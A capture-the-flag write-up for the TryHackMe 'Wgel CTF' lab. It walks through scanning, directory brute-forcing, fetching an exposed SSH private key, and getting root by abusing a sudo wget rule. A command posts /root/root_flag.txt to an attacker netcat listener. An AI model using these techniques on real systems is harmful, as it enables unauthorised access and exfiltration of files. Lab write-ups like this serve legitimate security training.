# Wgel CTF

Macinne consist in access to the server and privsec via wget.

## Nmap scan

```bash
 $ nmap -sC -sV -T4 10.10.185.51
Nmap scan report for 10.10.185.51
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This machinne have the port 80 and 22.

## Enumeration

Open browser and access to the ip, is a Apache Default site.

![Foto(https://raw.githubusercontent.com/n0obit4/CTF/master/TryHackMe/Wgel%20CTF/Pictures/Apache%20site.png)]

If we go deep more and view the source code we look a name that is a possible Username.

![Foto(https://raw.githubusercontent.com/n0obit4/CTF/master/TryHackMe/Wgel%20CTF/Pictures/Apache%20code.png)]

Then ** Jessie ** is a possible username.

## Fuzzing to the website

``` bash

$ gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.185.51/
```
The result is that and the sitemap directory catches my attention.
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/server-status (Status: 403)
/sitemap (Status: 301)
```
![Sitemap()]

Finding into the source code I didn't find anything.
<br>
We keep listing into the sitemap directory.

```bash
$  gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.185.51/sitemap
```
In this search i found ** /.ssh ** Directory.

![.ssh directory(https://raw.githubusercontent.com/n0obit4/CTF/master/TryHackMe/Wgel%20CTF/Pictures/ssh.png)]

We Download the file and give the respective permissions

```bash
$ wget http://10.10.185.51/sitemap/.ssh/id_rsa ;chmod 600 id_rsa
```
## access to the ssh

As we already found the possible ssh information, we proceed to access to the ssh.

Username: Jessie
Password: id_rsa file

```bash
$ ssh -i id_rsa jessie@10.10.185.51   
load pubkey "id_rsa": invalid format
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```
Successfully, we access to the machinne.

### user.txt

```bash
jessie@CorpOne:~/Documents$ cat user_flag.txt 

057c67131c3d5e42d***************
```
## Privsec

We Check the sudo permissions

```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
We go to the GTFObins(https://gtfobins.github.io/gtfobins/wget/#file-upload) File Upload

![Wget GTFO BINS(https://raw.githubusercontent.com/n0obit4/CTF/master/TryHackMe/Wgel%20CTF/Pictures/GTFO_wget.png)]

We put our machine to listen with netcat and prepare to receive the packet.

### Our Machinne

```bash
$ nc -lvnp 5689
```
### Victim Machinne

```bash
$ sudo /usr/bin/wget --post-file /root/root_flag.txt MYIP:5689/
```

### Get root flag

```bash
nc -lvnp 5689                                                   13:03:32
listening on [any] 5689 ...
connect to [MYIP] from (UNKNOWN) [10.10.185.51] 58358
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: MYIP:5689
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1da***************

```
